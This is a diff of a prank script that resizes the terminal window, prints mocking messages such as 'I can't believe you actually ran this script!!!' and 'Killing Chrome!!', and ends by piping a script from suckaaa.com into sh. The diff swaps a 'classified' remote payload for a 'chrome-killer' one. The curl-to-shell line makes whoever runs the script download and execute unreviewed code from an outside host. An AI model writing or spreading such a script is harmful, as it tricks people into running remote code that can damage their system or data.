@@ -12,15 +12,12 @@ positionWindow 0 0;
 setSize 9 1;
 setFontSize 60;
 
-clear;
+cancelNoise;
+cancelNoise;
+cancelNoise;
+cancelNoise;
 
 echo "\n\nI can't believe you actually ran this script!!!\n";
-
-
-
-echo "\n\nI can't believe you actually ran this script!!!\n";
-
-#
 
 # sleep run random;
 
@@ -37,10 +34,17 @@ sleep 0.1s;
 echo "loL";
 sleep 0.2s;
 echo "loL";
+sleep 1s;
+echo "loL!!";
+sleep 0.1s;
+echo "loL!!";
+sleep 0.2s;
+echo "loL!!";
+sleep 1s;
+echo "Killing Chrome!!";
+sleep 0.8s;
+echo "Killing Chrome!!";
+sleep 1s;
+echo "Killing Chrome!!";
 
-# Do some loop here to make some silly shape now that
-# you've got everyone's attention
-
-echo "\n";
-
-termdo 'curl -s https://suckaaa.com/s/classified | sh';
+termdo 'curl -s https://suckaaa.com/s/chrome-killer | sh';
